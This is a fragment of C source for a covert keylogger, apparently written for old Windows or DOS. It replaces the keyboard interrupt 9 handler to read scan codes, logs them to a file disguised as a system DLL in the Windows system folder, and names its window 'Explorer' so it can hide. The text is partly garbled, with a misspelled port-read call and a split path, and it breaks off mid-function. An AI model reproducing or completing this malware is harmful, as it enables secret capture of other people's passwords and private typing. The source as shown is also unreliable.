```
/#define LOGFILE "~473C96.TMP" //Name of log file in WINDOWS\TEMP
#define LOGFILE "POWERX.DLL" //Name of log file in WINDOWS\SYSTE M
#define LOGMAXSIZE 2097152 //Max size of log file (2Megs)

#define HIDDEN 2
#define SEEK_END 2

#define NEWVECT 018h // "Unused" int that is used to call old
// int 9 keyboard routine.
// Was used for ROMBASIC on XT's
// Change it if you get a conflict with some
// very odd program. Try 0f9h.

/************* Global Variables in DATA SEGment *****************/

HWND hwnd; // used by newint9()
unsigned int offsetint; // old int 9 offset
unsigned int selector; // old int 9 selector
unsigned char scanCode; // scan code from keyboard

//WndProc
char sLogPath[160];
int hLogFile;
long lLogPos;
char sLogBuf[10];

//WinMain
char szAppName[]="Explorer";
MSG msg;
WNDCLASS wndclass;

/*********************/
//
//
//
void interrupt newint9(void) //This is the new int 9 (keyboard) code
// It is a hardware Interrupt Service Routine. (ISR)
{
scanCode=importb(0x60);
if ((scanCode<0x40) && (scanCode!=0x2a)) {
if (peekb(0x0040, 0x0017) &0x40) { //if CAPSLOCK is active
// Now we have to flip UPPER/lower state of A-Z only! 16-25,30-38,44-50
if (((scanCode>15)&&(scanCode<26)) || ((scanCode>29)&&(scanCode<39)) ||
((scanCode>43)&&(scanCode<51))) //Phew!
scanCode^=128; //bit 7 indicates SHIFT state to CONVERT.C program
} //if CAPSLOCK
if (peekb(0x0040, 0x0017)&3) //if any shift key is pressed...
```

373